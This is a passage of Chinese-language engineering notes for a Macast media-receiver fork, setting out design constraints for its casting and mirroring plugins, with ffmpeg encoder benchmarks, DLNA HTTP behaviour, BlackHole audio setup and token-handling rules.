（`iina` / `web` / `live` / `potplayer` / `pi_fm` 渲染器 + `nirvana` 协议，状态 `vendored`），
以及本 fork 自研的 9 个单文件插件（yt-dlp 下载 `macast_ytdlp` / 外部播放器 `external_player` /
小窗+壁纸 `floating` / 自动化钩子 `hooks` / Chromecast 中继 `cast_bridge` / AirPlay 音频 `raop` /
屏幕镜像 `screen_mirror` / 本地文件投屏 `cast_local_file` / AirPlay 镜像接收 `airplay_mirror`）。
这 9 个自研插件是**单文件**插件，所以：

- 只能用「Macast 已带的库 + 标准库 + 机器上已有的命令行程序」。要 pip 库就走内置插件
  路线（§4.4 的三处打包配置）。
- **Macast 一次只能选一种渲染器**：12 个渲染器类插件互斥（菜单栏切换；含上游合集的
  `iina` / `web` / `live` / `potplayer` / `pi_fm`），`raop` 与 `airplay_mirror` 是协议插件，
  可以和任意渲染器共存。
- **插件在菜单栏里有没有一行、能不能替核心挑设备，都是类属性不是标题**：
  `MENU_HIDDEN`（现只有 `screen_mirror` 声明 —— 它的控制面是设置页那个 tab，见本行末尾与 §4.2
  「菜单项的 `data` 是一个列表下标」那条）与 `URL_TARGET_RENDERER`（现只有 `cast_local_file` 声明 ——
  「网页地址投屏」的设备下拉复用它已经有的发现与发送面，见 §4.14）。两者都由
  `MacastPluginManager.exported_class()` 读，**永远不按标题比对**：`resolve_title()` 让用户可以改显示名。
- 定位一律用 PATH + 常见安装目录（GUI 从 Finder 启动拿不到 shell 的 PATH；`yt-dlp`
  / `shairport-sync` / `uxplay` / 播放器都踩这条，且**都在插件启动时再找**，不是 import 时）。

最容易踩的几处，改这些插件前先看：

| 插件 | 红线 |
|---|---|
| yt-dlp | 下载模式**不启动 mpv**，所以它覆写了 `start/stop`，并用 `_mpv_started` 记住「mpv 到底起没起」——`MPVRenderer.stop()` 会 join 只有真起过才存在的线程。流模式把 ytdl 路径**合并进已有的 `--script-opts`**（再写一条会顶掉 OSC 的设置）。 |
| external_player | 播放器用 **argv 列表**启动，绝不拼命令行（url 来自网络）。暂停不实现，停止只杀自己起的进程。 |
| floating | 覆写 `build_mpv_params` 前先**删掉继承来的 `--geometry/--autofit/--fullscreen/--ontop-level`**，否则会和全局 Player Size 打架。壁纸模式要先探测 mpv 是否认识 `--ontop-level=desktop`：未知选项会让 mpv 起不来，而启动器的反应是重试 3 次后**把服务停掉**。 |
| hooks | 命令是 shell 命令（用户自己写的），但 **url 只走环境变量**，不拼进命令串。spawn 完即返回，不阻塞 CherryPy 工作线程。 |
| cast_bridge | 复用 `protocol_cast` 的 Cast v2 收发，不引 pychromecast。投屏序列是 deviceauth CHALLENGE → CONNECT receiver-0 → LAUNCH → CONNECT transportId → LOAD，`transportId` 来自 LAUNCH 的回复，**不要硬编码**。发现用 mDNS 且必须在后台跑（`build_menu` 在 UI 线程上）。 |
| raop | 只监督 shairport-sync（生成最小配置 + 拉起 + 报连接/断开），**不**把 RAOP 映射成 DLNA 播放状态。`uses_ssdp = False`，否则只有它启用时也会把 SSDP 服务拉起来。v0.2 起有第一个持久化配置 `RAOP_Device_Name`（覆盖服务名，缺省跟随友好名；见 §4.11）。 |
| airplay_mirror | 只监督 **uxplay**（iPhone 的「屏幕镜像」列表里那个接收端在这台 Mac 上就是它），`uses_ssdp = False`，**不**映射 DLNA 播放状态 —— 它和 `raop.py` 是同一族形状。红线五条，全部来自上游源码而不是试错：① **配置走 `-rc <file>`，绝不走 `$UXPLAYRC`** —— 后者在文件不存在时**静默回落 `~/.uxplayrc`**，等于读（甚至被诱导写）用户主目录里的配置；文件写在 `utils.SETTING_DIR` 里，用户附加项**放在末尾**所以能覆盖我们的默认值（rc 后写的赢，argv 又在 rc 之后解析）。② **绝不加 `-p`**：`-p` 是 legacy 固定端口 7100/7000/7001，7000 正是自家 `AIRPLAY_PORT` 和 macOS 自带接收端的地盘；不带 `-p` 时 uxplay 用动态端口并写进自己的 mDNS TXT，发送端照它连，固定端口只有坏处。③ **stdout 必须挂在 pty 上**：uxplay 的 `log()` 是 `printf`，全程序只有一处 `fflush`（音频进度），挂管道 ⇒ **块缓冲** ⇒ "谁连上了"永远不出现；POSIX 用 `pty.openpty()`，Windows 退回管道（用例直接问 `os.isatty(read_fd)` 来守这个契约，比测时序稳）。**父进程必须 `os.close(child_fd)`**，否则读线程永远等不到 EOF。④ **退出上报要认身份**（`self._proc is not proc` 就闭嘴）：`reload()` 之后旧 reader 若照常上报，用户看到的是"uxplay 已退出"而它其实活得好好的。⑤ **与 `raop.py` 抢同一个 mDNS 名字**（uxplay 是完整的 AirPlay 接收端：镜像 + RAOP），所以两个都启用时 iPhone 只有一个入口 —— 不猜、不改名，只在启动时按**已启用协议标题**提示一次（判定要归一化 `lower().replace(' protocol','')`，`"AirPlay Protocol"` 才是内置接收端的真标题，见 §4.2）。**找不到二进制是正常状态不是 bug**：macOS 没有 Homebrew formula、官方 release 不含二进制，必须自己编译 ⇒ 提示里给完整配方而不是"装一下 uxplay"（`selfcheck.py` 给同一段）。 |
| cast_local_file | 直通/转码**按 ffprobe 逐文件判断**，不按扩展名猜（`COPY_CONTAINERS` / `COPY_VIDEO_CODECS` / `COPY_AUDIO_CODECS` 三张表 + `plan()` 的理由字符串会直接出现在菜单里）。转码路径写**会一直变大的临时文件**而不是管道 —— 管道没长度、不能重连、不能拖动，而 DLNA 接收端**根本不播**报不出长度的流；对外长度 = 时长 × 码率并压在 `MAX_ADVERTISED_SIZE = 1.9 GB` 之下（老固件在有符号 32 位里做这件事），被这个上限卡住时**降码率**而不是谎报长度。**HTTP 语义三条红线**：① `parse_range(None)` 回 `(0, None)` 是「从头」= 整文件答案，**不是** partial —— 只有客户端真发了 `Range` 才配 206 + `Content-Range`，否则 200 且不发 `Content-Range`（写成 `spec = parse_range(header)` 的代价就是"整文件读也回 206"，Part 25 三条用例抓住它）；② 注册过但**已经消失**的文件必须拒答（`total == 0 and entry.job is None` → `_refuse()`），回一个没有长度的 200 会让播放器永远等字节；③ 读超过写入速度时**等**而不是回短答案。**音轨/字幕/`AudioDelay` 只在转码路径存在**，选了非默认音轨就**改判**为转码（直通是把原始字节交出去，设备的轨道表没法从这边重排）。字幕分三条路：Cast 转 **WebVTT** 进 `LOAD.textTracks[].contentId`、转码路径在**这个 ffmpeg 有 libass** 时烧进画面、DLNA 两条都没有。**停止发 QUIT_APP 不只是 STOP**：只 STOP 会把接收端 app 停在最后一帧，而且**我们自己的 Cast 接收端**也会继续声称还在播那部片子（Part 25 里那条 A/B 就是打在 `macast/protocol_cast.py` 的会话账本上的）。看门狗重投**有预算**（`MAX_REPUSH = 3`，`_begin(retry)` 不吃重投带来的新预算），第 4 次就认输并说明原因；被抢占后重投要按设备上报位置 `Seek`（DLNA 是 `H:MM:SS` 文本）。发现与能力探测（VideoToolbox / libass / 音频采集口）**一律不在 UI 线程**，`_tool_cache` 按工具分键缓存。**avfoundation 的设备表要同时认两种拼写**：真 ffmpeg 打的是 `AVFoundation audio devices:` + 不带引号的 `[0] 名称`，历史上按 `"名称"` 解析的版本**在这台机器上一条都读不到**（症状是"系统声音档位永远说没有采集口"，而不是报错）。发给设备的 SOAP 与其 UTF-8 `Content-Length` 同 screen_mirror 条 ⑤ 的红线（按字节数算，`len(str)` 会被中文设备名截断）。 |
| screen_mirror | 实时链路：ffmpeg 截屏（darwin avfoundation / win32 **ddagrab**（v0.20 起；被桌面拒绝就本次运行内回落 gdigrab，见本行末）/ linux x11grab，**Wayland 不支持要明说**；`-list_devices` 的真实形状是 `AVFoundation video devices:` + `[N] name`，**没有引号**，见 §4.2 末条）→ 插件内 HTTP 服务持续吐一条实时流 → **封装由「输出目标」决定**（`cast` → `video/mp2t` + Cast `LOAD streamType=LIVE`；`browser` → 分片 MP4 `frag_every_frame+empty_moov+default_base_moof`（v0.19 起；v0.10–v0.18 是 `frag_keyframe`，见本行末的延迟重算）+ 自带 MSE 播放页（**页面上有一块 YouTube 那样的推流统计浮层**，顶栏「统计」开关 + `localStorage` 记住；三组数字 = 打开页面时一次性注入的 `page_diag(session)` + 每秒轮 `/browser/stats` 拿发送端计数器 + 播放器自己算的码率/积压/距直播边缘/掉帧。**红线三条**：① 那个端点**只能用 `page_token`**（和页面同一道 `hmac.compare_digest`），**绝不能用常驻 `Api_Token`** —— 观看 URL 会被转发，管理令牌泄露一次等于永久开放管理 API；② **正文里不许再抄一遍 token**（JS 从自己所在的 URL 读回来），且全部文字走 `textContent`；③ 浮层与设置页「统计信息」卡片**必须读同一批计数器**（`page_stats` 与 `stats()` 各自只是转发 `session` + `broadcaster`），谁都不许另算一份 —— 两处答案不一致比没有数字更糟；④ **`PLAYER_PAGE` 必须是 raw 串**（2026-09-24 真浏览器验收：内嵌 JS 的 `'\n'` 被非 raw 的 Python 字符串吃掉 ⇒ 页面抛 `SyntaxError`、面板全空、按钮死、视频不播，而**当时 18 条 Python 用例全绿**；现在用例扫服务端真正吐出的那份 JS：任何 JS 字符串不许跨真实换行，数撇号前先剥掉 `//` 注释）；⑤ **两个"每秒"单位不许共用一个格式化函数**（档位是 bit/s、流量计数器是 byte/s，混用的结果是 4 Mbps 印成 32 Mbps），且**帧率报两个数**：窗口被遮挡时 Chrome 只给 1–2 fps 上屏而解码照旧 24 fps，只报上屏就会把浏览器节流读成"镜像坏了"。它**只在浏览器目标存在**：电视上的画面不在我们手里）。`dlna` → 见下「伪装成文件」）。**编码器不是平台决定的**：`auto` 一旦能力探测给过答案就落在 VideoToolbox（`has_hardware_encoder()` 会 spawn ffmpeg 问一次，缓存**按 ffmpeg + 平台**分键，探测只在后台跑，绝不在 UI 线程上 spawn），**理由是延迟换 CPU，不是吞吐** —— 原来这句写的是"CPU x264 撑不住 Retina 桌面的实时帧率"，2026-10 实测证伪 —— 而**这个证伪自己也被证伪过一次，两半都要记**：
① **离线吞吐**：喂**文件**时 libx264 ultrafast+zerolatency 在 1920×1080 / 2560×1600 / 3456×2234 分别是
**486 / 295 / 171 fps（5.6–17.9 倍实时），代价 4.20 / 4.63 / 4.94 核**。这些数**都是真的**，
但**一个都不是镜像的成本** —— 镜像要的帧数不会超过采集交出来的那 24 fps。
② **在线成本**：喂真实 24 fps 桌面采集，同一条 argv 在 1080p 只吃 **0.59 核**，VideoToolbox **0.41 核**
（2026-10-02 三次跑，`scripts/encoder_latency_probe.py`；2160p 是 1.12 核对硬件 HEVC 的 0.64 核）。
所以真正的取舍是 **首帧约 200 毫秒 换 0.18 个核**，不是"41 毫秒换 4.5 核"——
**把离线天花板当成在线成本，会让硬件默认看起来便宜二十倍**。
（这一格我自己在探针 docstring 里反过来错过一次：写下"17.9 倍是帧复制 bug 不是结果"，
跑一遍离线形状它就复现了 —— **文档是对的、我那句"更正"是错的**，已就地撤回并留下这句话。）
用户报的"不开硬件编码几乎看不到画面"确实是**采集一帧都不返回**那一路（另见本行"读不到的音频口会饿死整条采集"），
但**这一族有两个各自独立的成因**，都只在软件路径上现形、都把读者送去 `PERMISSION_DOOR`（屏幕录制授权）
那个**真实、却不是他们需要的门**：
③ **`-level 42` 曾被写死给 h264_videotoolbox**：画面比 level 4.2 的 8704 宏块上限大就退出 **187**、
只写约 2 KB（本机 3456×2234 原画与 2160p 各复现两次；换成 `testsrc2` **文件源**照样复现 ⇒ 与采集无关）。
而 `auto` 在 Mac 上就落在硬件 ⇒ **原画档出厂即"什么都不产出"**，`has_hardware_encoder()` 抓不到
（它只 grep `ffmpeg -encoders`）。修法是 `vt_level(height)` 按**将被编码的高度**查表、查不到就**不钉**
（VT 自己在 1080p 选 level 4.0，比我们钉的 4.2 更保守）；`encoder_args(kind, platform=None, height=None)`
第三个参数默认 None = "不知道" = 对 VT 不钉，**方向是安全的那一边**（少钉一个 level 只是 SPS 不那么明确，
钉错一个 level 是每一帧都没了）。caststream 仍然钉 42 是**对的**：那里的 OFFER 已经把画面钉成 1920×1080，
level 是一句承诺而不是猜测。
④ **非 DLNA 路径曾没有输出 `-r`**：采集在 `Configuration of video device failed, falling back to default`
之后时间基退化到无法估帧率，x264 于是算出 `MB rate (14400000000) > level limit (16711680)` 并**一个字节都不编**；
VideoToolbox 容忍同一个畸形输入 —— 所以这条**只在软件回落时现形**，恰好是采集本来就已经不高兴的时候。
单变量实测：不加 `-r` **0 字节**，加 `-r 24` **3,932,160 字节**。现在 `build_ffmpeg_command` 对每条直播形状
都钉 `-r FPS`（`build_dlna_command` 一直钉 `-r profile.fps`，所以 DLNA 从没中过这一枪）。
**`-r` 与 `-fps_mode vfr` 互斥**（CFR 会把 `mpdecimate` 丢掉的帧原样复制回来），这是 `mpdecimate`
**没被采纳**的两个原因之一；另一个是 DLNA"伪装成文件"的 `Content-Length` 由名义码率推出，
少产字节会抽干电视的缓冲。它量到的收益也是**带宽不是延迟**（首帧 +4～14 毫秒，字节 −26～−28%，
而且那是静止桌面的最好情况，放视频时几乎不掉）。
那 ~200 毫秒**没有任何 VT 选项能拿掉**（`-realtime`、`-prio_speed`、`+constant_bit_rate`、
`+max_ref_frames 1`、`-bf 0`、`-coder cabac` 逐个试过；`-realtime 1` 与不传它输出逐字节相同 ——
它只选低延迟码控路径，不买延迟）。所以 `auto` 仍然落在硬件，但**这条默认的理由已经变弱**：
0.2 个核很便宜、200 毫秒不便宜，**翻不翻这个默认是用户的决定而不是测量结果**，所以没在这里替用户翻。
无论翻不翻，**页面必须把这笔账说出来**（`ENCODER_TRADEOFF` → `_capture_state()["encoder_note"]` →
采集卡那条 hint；它引的是**在线**数，并注明两边都含约 0.5 秒 ffmpeg 启动所以要看差值），
否则那个开关读起来就是"硬件=好、软件=差"，**没有第四档 `lowlatency`**：`encoder_args("software")` 已经是 x264 ultrafast+zerolatency，再加一个同 argv 的档位等于给用户两个做同一件事的菜单项。另一条同源修正：**VT 会把 `-b:v` 少给 30–33%**（要 4 Mbps 实发 2802 kbit，而同一个 4 Mbps 目标下 VT 的 VMAF 91.47 高于 x264 ultrafast+zl 的 90.78@4216 kbit —— 是保守不是画质差），所以 `rate_target()` 在 VT 上**要 1.5 倍**，让线上码率等于菜单承诺的那个数字；显式选的档位仍然被尊重，而一台其实没有硬件编码的机器在**启动时**（不是在判断时）回落 x264。**v0.10 起控制面板整个搬进设置页的「电脑投屏」tab，v0.12 起菜单栏里一条镜像行都没有，只剩通知**（停止走 tab、「停止接受投屏」或换渲染器，三条路都汇到同一个 teardown）。**慢消费者丢整块、绝不阻塞读管道**（阻塞会把编码器冻住；"丢整块"从 v0.10 起是真的整块 —— fMP4 按 `moof+mdat` 一片、TS 按 188 字节一包对齐丢弃，边界落在半包上时后加入的观看端永远对不齐；队列按**秒**预算而不是字节，`LIVE_QUEUE_SECONDS` ≈0.75 s，档位码率改的是队列块数）；ffmpeg 进程和 HTTP 服务**一启动就移交 renderer 持有**，终止统一由 pump 线程按 generation 判定上报（否则权限被拒会静默黑屏、或双线程抢清理）。杀掉/让位前先增 generation，让 pump 的死亡上报闭嘴。**重播不对称**（红线）：浏览器会话重播 init segment + 8 MiB 环形尾部，cast（Chromecast）会话永远只拿「接下来」的字节 —— 给电视重播积压 = 它此后一直慢几秒；`dlna` 会话是第三种形状：**按绝对字节偏移**从 48 MiB 环形缓冲里取（电视把它当文件读，会 HEAD、探边界、断线重连同一偏移），见下「伪装成文件」。**`_retain` 里 init 头必须切到第一个 `moof` 才算完**（晚加入的观看端拿双份头 = 花屏，别把它想成"缓存一点前缀"）。观看地址带**每会话随机**的 `stream_id` + `page_token`（`hmac.compare_digest` 常量时间比对），**故意不用应用的常驻 `Api_Token`** —— 那是管理令牌，泄露一次等于永久开放整套管理 API，而镜像页 URL 会被复制/转发/贴进群。页面 JS 只用 `textContent`，响应带 `nosniff` + `no-store`。DLNA 推流来时**让位**并转投该 URL（Bridge 行为）—— **cast 与 dlna 两个电视目标都会**；浏览器目标下推送会被明确拒绝而不是杀镜像（`set_media_url` 的守卫顺序：空 url → 同一 URL 重复推 → 无目标；"无目标"按当前 kind 分别查 `target()` / `dlna_target()`，**别只查一个**，否则浏览器目标会误以为有中继对象）。镜像期间 `caffeinate -dimsu` 持有休眠断言，teardown 释放。**系统声音只在有采集口时开**：macOS 认 BlackHole 设备（FFmpeg 发行版至今抓不了 mac 系统音频）、Linux 认 pulse `<sink>.monitor`、**Windows 走 dshow `audio=立体声混音 (Realtek(R) Audio)`**（`_probe_windows` 在 ddagrab 与 gdigrab 两条路上都会把那个输入**附在 `capture.inputs` 里**并给出 `audio_map='1:a:0'`，所以"Windows 仅画面"这句在本仓库的历史文档里写过、**现在是错的**；设备名而不是 ffmpeg 打出的 `@device_cm_{...}` 标识符才可用——后者在真机上 `Error opening input file`），**但这一路的代价见下条 v0.26 取证：把 dshow 音频读进输出会把画面更新率压到 ~1–2 Hz**；探测结果缓存在 `_capture_cache`（键含 cursor —— 指针开关会改采集命令，改指针/屏幕要 `invalidate_capture_cache()`）。**「一轮搜索没结果」不是一句话，是五种机器状态**（v0.10/v0.12）：正在搜 / 真的没人应答 / 只有这台 Mac 自己的接收端（已被滤掉）/ 应答了但描述拉不到 / 网络侧读不到网卡 —— 判定收在 `_search_words(...)` 一处，**每一格都必须给出下一步**（电视是否开机、是否在同一个网络、点「重搜设备」）。两个曾被踩空的细节：① **一条 M-SEARCH 不等于搜过一次** —— 刚唤醒的接收端还没加入组播组，所以一轮发两条（间隔 timeout×0.45）；② 钉住网卡时组播要显式设 `IP_MULTICAST_IF` 从那个口出去，光设源地址不够；没钉网卡时**不要猜出口**，交给内核，猜错会让虚拟机网桥把搜索吞掉。**「有采集口」和「声音真的进得来」是两件事**（v0.12）：聚合设备建好、默认输出切过去，都不保证 ffmpeg 那一路听得见 —— 所以控制台问的是**当前默认输出设备的 UID** 是不是采集用的那块设备（`system_audio_routed()`），页面据此区分「已启用」与「有声音进来」，而不是只报一个"装好了"。**读不到的音频口会饿死整条采集，而且一句话都不说**（2026-09-23 在装好的 `.app` 上实测）：avfoundation 把系统声音当作**麦克风**输入，麦克风授权没给（或 BlackHole 那头没人喂时钟）时它不报错，而是**连画面也不再产帧**；3 秒预算到点后 ffmpeg 只留下两句在**正常采集里也会出现**的运行时噪声（`objc[…]: class \`NSKVONotifying_AVCaptureScreenInput' not linked` 和 `Configuration of video device failed, falling back to default.`），把它们当成原因就是误导 —— 同一台机器、同一条命令，把音频口拿掉 6 秒就写出 3.9 MB H.264。现在三处收口：`FFMPEG_NOISE` 把"健康采集也会打"的行挡在消息之外（日志照旧全留）、无帧时先用 `video_only_capture()` **降级成只采画面**（杀进程前**先增 generation**，否则 pump 会把我们自己这一刀报成"采集中断"）、每一条"没有返回画面"都必须给出门（`PERMISSION_DOOR`）与「勾选后重启 Macast」，降级成功的通知也要说出少了声音和去哪补（`AUDIO_DROPPED_SUFFIX` 点名麦克风），**并且这句话必须活在页面上而不只是一次性通知**（`renderer.audio_dropped()` 是会话自己的答案，`_status_line` 挂 `AUDIO_DROPPED_MARK`、`_audio_line(renderer)` 在会话弃声时不再说「已启用」—— 通知闪过就没了，「系统声音：已启用」配上一条无声的镜像正是 v0.12 要终结的那个谎）。**同一条接缝在别的平台上也必须真的生效**（Part 40）：`_audio_line(renderer, platform=...)` 的 `platform` 是文档写明的测试接缝，而三条「未启用」分支读的是 `sys.platform` —— 在 Linux runner 上问 `platform='win32'` 拿到的还是 Linux 那句，也就是说"该去哪个系统面板"这句话会随**跑代码的那台机器**变。现在三条都问 `platform`，Linux 的那一句给出门（`PULSE_DOOR`：`pactl get-default-sink` 问得出默认输出设备 + 装 `pulseaudio-utils` + 点「重新探测采集」，而不是只报一个"需要 PulseAudio"），`_default_pulse_monitor` 也不再把手动的 `except Exception: return None` 当成"没有线索可留"（分 `OSError`（pactl 根本不在）与其它，`logger.debug` 记下 pactl 的 stderr —— 探测是缓存的、不在热路径上）。回归用例 Part 38。**通知本身不是「清理」的前置条件**（2026-09-24 Windows 实测崩溃）：pystray 的气泡缓冲是
`szInfo[256]` / `szInfoTitle[64]` **字符**（不是字节），超了 ctypes 直接抛 `ValueError: string too long`，
而 `cherrypy.engine.publish('app_notify', …)` 会把订阅者的异常原样抛回**发布方线程** —— 于是 `_fail()`
炸在它自己的 `notify()` 那一行，调用者写在**下一行**的 `_teardown()` 被跳过：页面读「未镜像」而 ffmpeg 与观看
HTTP 服务还在跑。修在边界上，两层：`gui.fit_notification()` 把超长文案压进缓冲且**保留头 + 尾**、中间挂
「……（全文见设置页「电脑投屏」的活动）」（尾巴才是可执行的那半句，砍尾等于违背本行「每一条失败必须给出门」），
`screen_mirror.notify()` 吞掉 publish 失败并记 warning。用例：Part 36 的假托盘按真缓冲宽度拒收，Part 38 用
一个抛异常的订阅者证明 `_teardown` 仍然跑到；真机侧用真 `NOTIFYICONDATAW` 量过（不截断必抛、截断后正好 256）。
CoreAudio 聚合字典的读法在本机 CLI 沙箱里问不出来（SDK 缺 `AutoHAGTypes.h`、带缓冲才回 `!dat`），**这一条判定要在真 Mac 上验收**，别把它写成已验证。**v0.3 起一键辅助装 BlackHole**（设置页「电脑投屏」→「系统声音 → 一键设置」）：地址与 sha256 以 Homebrew cask API 为准（拉不到用 PINNED 兜底）→ `open` 图形安装器（用户输一次密码，.pkg 无法静默装，**别把它想成全自动**）→ 轮询设备出现 → ctypes 调 CoreAudio 建/复用**多输出聚合设备**并切默认输出（UID `com.macast.screenmirror.output`，原默认存 `Mirror_Audio_Original` 供「恢复原声音输出」）；**任何一步失败降级为打开「音频 MIDI 设置」+ 文字指引**。
**v0.7/v0.9 修的是"一键设置安装失败"的三类真实根因**（症状都是「装了却没有设备」，旧流程只会说"安装被取消了吗？"）：
① **pkgutil 残留记录但驱动文件已不在磁盘** —— `_blackhole_receipt_present()`（问 pkgutil 记录）与
`_blackhole_driver_installed()`（glob `/Library/Audio/Plug-Ins/HAL/BlackHole*.driver`）是**两个问题**，
**别拿记录当安装状态**；检测到"记录在、文件没在"就直接重装并在 probe 步骤里说清楚原因。
② **官方 .pkg 的 postinstall 只 chown/chmod，从不重启 coreaudiod** —— 驱动落了盘但守护进程永远不加载；
等设备安装超时后若发现"文件在盘上但列表里没有"，用 osascript `do shell script … with administrator privileges`
**征求一次管理员密码**重载 coreaudiod 再等 45 秒（`-128` = 用户取消密码框，要如实报"你取消了密码框"，
**别伪装成超时**）。
③ **probe 分支"把跳过写成了一个句子"**（v0.9，就是用户报的"重启后再点一键安装又要安装一遍，永远装不完"）——
旧代码在"驱动文件在磁盘上"时打印 `安装会被跳过`，然后**照样 fall through** 到 meta/download/verify/install，
于是每次点一键都重新下载一个 pkg、再开一次安装器，而 `reload` 只有等满 300 秒超时才可达。
修法是把判定收成一个值：**`_blackhole_state(ffmpeg)` 五态**（capturable / loaded / on-disk / stale-receipt / absent），
**"跳过"必须是步骤机里的 skipped 状态，不是 note 里的话**。两个见证者必须分开报：
avfoundation（`_has_blackhole`，采集真正会用的那一个）与 CoreAudio（`_find_blackhole`，无权限门槛）不一致时
是**麦克风权限**问题，重装 pkg 永远修不好 —— 这一支照样建聚合设备、切默认输出，但**结尾不许说"已就绪"**：
把 `probe` 改标失败（步骤机允许：这一轮的真实结论就是那个否定答案，绿色的页面 + 没有声音 = 原来那个幻觉），
并点名「系统设置 → 隐私与安全性 → 麦克风」（`.app` 缺 `NSMicrophoneUsageDescription` 时系统连弹窗都不给，
声明在 `scripts/setup_py2app.py`）。**每一支失败文案都要说出"再点一次不会重新下载"**。
整套流程走 `_SetupProgress` 步骤机（env/probe/meta/download/verify/install/wait/reload/aggregate/output；
**done 步骤拒绝重入 = 进度条永不回退**；skipped 不进分母），同时起一个 **127.0.0.1 随机端口**的实时进度页
（每轮随机 token + `hmac.compare_digest`，同样**绝不用常驻 `Api_Token`**；nosniff+no-store；textContent-only；
跑完保留 300 秒可读再自动关；**页面起不来不算安装失败**——通知里仍带每一步）。
失败必须**指名到底哪一步**：`_route_audio_through_blackhole` 内部把"聚合设备"与"切默认输出"分开标失败，
外层不再 blindly fail('aggregate')（否则"设备建成了但切换失败"会谎称创建失败）。CoreAudio 的坑：`kAudioObjectSystemObject` 是 **1**（0x1000 是 hardware model，问它要设备列表回 `'nope'`）；`inDataSize` 是 `size_t`；NULL-data 的探测在本机被拒——直接带大缓冲问。CLI 沙箱里设备枚举不可用（只有 `dOut` 通），所以这套 ctypes **要在真 Mac 上验收**；读接口都在，测试只打桩不触碰。**v0.5 的 DLNA 电视目标 = 把直播伪装成一个文件**（MirrorCast 那一族的做法），红线集中在四处：① `Content-Length` 必须是**按档位码率算出来的固定值且 < 2³¹**（老固件用有符号 32 位记长度，报 `-1`/报超大都不播），时长与 `Duration` 要和这个长度自洽；② 每次响应都要带 `Accept-Ranges: bytes` + `transferMode.dlna.org: Streaming` + `contentFeatures.dlna.org`，探边界的请求要**恰好**回 n 字节（不足用 MPEG-PS 填充包 `00 00 01 BE 00 00` 补），206 才配 `Content-Range`（**没带 Range 的请求即使语义上是"整个文件"也必须回 200 且不发 `Content-Range`**，`bounded` 和 `has_range` 是两件事）；③ 推流前先攒 `dlna_prefill_bytes(profile)`（= 档位总码率 × **用户选的**秒数，夹在 2–8 MiB，v0.10 前是写死的约 20 MiB）再交给电视，代价是**看得见说得出的延迟**（默认画质下五档都是约 4 秒 = `DLNA_PREFILL_SECONDS` × 码率，状态行/开始提示都要报秒数）。**2026-10 起这个秒数是「投屏形状」卡上的一个旋钮**（`Mirror_Dlna_Prefill`，1/2/4/6/8，改它重启镜像）：`dlna_prefill_seconds_setting()` 越界**夹住而不是拒绝**（拒绝的后果是一台不肯播的电视加上没有任何解释），`dlna_prefill_bytes(profile)` 保持**一个位置参数**（Part 21/23/37/39 都用 `lambda profile: …` 打桩它，多一个参数就在与打桩无关的地方炸成 TypeError），`dlna_prefill_seconds(profile)` 仍**从字节预算反推**而不是把设置读回来（预算被 2 MiB 下限或 8 MiB 上限挪过之后，这两个答案不一致比任一个近似都糟）。**默认仍是实测过的 4，不是下限的 1** —— 理由写在 `DLNA_PREFILL_MIN_SECONDS` 上：MirrorCast 在真 Philips 43PFS5301（2016，非 Android）上预填约 20 MiB ≈ 20–25 秒且明说，所以"要得比我们下限更多"的固件确实存在，而这台机器上没有那样的电视可以量出**我们的**下限；**量不出来的数就交给能量它的人，代价印在旁边**（`DLNA_PREFILL_HINT`：「这个数字就是看得见的延迟」）。顺带记一条**这一趟才修的谎**：`OUTPUT_HINTS['dlna']` 原来是模块级字面量，于是它永远说"约 4 秒"，而用户把它调成 2 之后卡片仍在说 4 —— 现在读它的一律走 `output_hint(kind)`，那个函数**当场重算**。同一族还有 `OUTPUT_HINTS['caststream']`：它写着"纯 Python 加密，上限 4.5 Mbps"，在②改完之后**整整过期了一轮**（那句提示会把人送去找一个已经不存在的限制），现在两个数都由 `cast_stream_bitrate_cap()` 与 `native_aes_name()` 算出来。**浏览器那一端有一个同形状的旋钮**：`LIVE_EDGE_SECONDS`（播放页停在直播边缘后面几秒，2026-10 前写死 3 秒）现在是 `Mirror_Live_Edge`（0.5/1/2/3/5，默认 1.0），**改它不重启镜像** —— 这个数是发页面时注进 HTML 的（`@LIVE_EDGE@` 占位符，与 `@DIAG@` 同一套写法），刷新观看页就生效；为改一个播放器从自己 HTML 里读的数字去重启一次采集，是"用最贵的方式什么都不做"。**下限是 0.5 秒不是 0**，但理由换过一次：v0.18 写的是"这一路分片节奏是 `gop_size('browser') = FPS // 2 = 12 帧 = 0.5 秒`（fMP4 分片要等**下一个** `moof` 才算完），1.0 秒留了两个分片余量"——那句随 v0.19 的 muxer 改动作废（分片变成每帧 41.7 毫秒，0.5 秒已是 12 个分片）；现在这个下限站在实测上：0.5 与 1.0 只差 9 ms（829/838，噪声内）。**v0.18 还写下过一句"`movflags=+frag_every_frame` 不在这个改动里"**（理由：分片本来就是 0.5 秒、切到一帧买不到东西却每帧多一个 `moof`，约 40 kbps），那是从批准措辞里**主动缩小**的一处 —— **v0.19 用探针把它推翻了**（`scripts/mse_latency_probe.py`：真浏览器 + 真采集 + 硬件编码；矩阵与脚注在 `docs/research-screen-mirroring-transport-2026-10.md` §3）：同一个 `-g 12` 只换 muxer，端到端 lag p50 **1305 → 838 ms（−36%）**、VMAF 同值（94.42）、字节 +~1%；更密的 `-g 2` 被否掉（VBQ 抽干，画质 93.9→81.1）；**park 在细粒度下失效**（1.0 vs 0.5 差 9 ms、0 seek），所以 `Mirror_Live_Edge` 默认不动，它从"延迟控制"变成了"恢复距离"。这带来两条新契约：① **分片不再保证以 IDR 开头**（`frag_keyframe` 的副产品作废），`_Fragments` 逐片做真 IDR 检查（`starts_with_keyframe` 解 moof+mdat 的 AVCC，SEI/SPS/PPS/AUD 前置要跨过，读不懂一律 False —— 错的 True 是贵的那个方向），`_Broadcaster.tail()` 因此**割到最新的可重播分片**；ring 里一个都没有时回空而不是喂糊（`keyframe_misses` + 一条 warning），而**全可入**的 ring（未分帧回落形状）仍整环重播 —— Part 22 的老契约在那里原样成立（v0.19 第一版把全 True 的 ring 裁成"只有最新一块"，正是它变红抓出来的）；② `LIVE_EDGE_MIN_SECONDS` 仍 0.5。回归用例 **Part 53**（12 条：AVCC 逐格、framer 三字段、ring 割点/拒绝/计数/日志、全可入整环），Part 43 与 Part 44 各补一条（Matroska 不得被当成重播点；帮助与观看页提示引的 41.7 毫秒必须由 `FPS` 算出来）。`PLAYER_PAGE` **必须继续是 raw 串**（§4.8 红线④），新占位符没改变这一点。环外偏移要报丢块而不是回错字节（`_ByteLog.read` 里 `max(absolute, _start)` 的钳制不能省 —— 负数切片会真的把**新**数据当成旧偏移发出去）；④ **档位**（`DLNA_PROFILES`：ps-pal / ps-ntsc / ts-mpeg2 / ts-h264 / mkv-h264）决定封装、帧率、帧尺寸、`-g` 和**音频编码**（PAL/NTSC 用 AC-3 不用 AAC，DVD 